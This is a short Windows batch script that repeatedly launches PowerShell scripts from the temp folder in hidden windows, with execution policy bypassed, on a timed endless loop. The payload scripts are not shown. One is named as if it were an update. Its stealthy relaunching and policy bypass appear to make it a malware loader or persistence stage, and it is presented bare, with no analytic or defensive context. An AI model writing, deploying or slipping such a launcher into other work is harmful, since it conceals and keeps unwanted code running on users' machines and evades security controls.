@echo off
start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%TEMP%\Update.ps1"
set sp1="%TEMP%\p.ps1"
set sp2="%TEMP%\RunX.ps1"

:loop
timeout /t 3 >nul

if exist "%sp1%" (
   start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%sp1%"
) else (
   start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%sp2%"
)

timeout /t 36 >nul
start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%TEMP%\stop.ps1"
timeout /t 1 >nul
goto loop
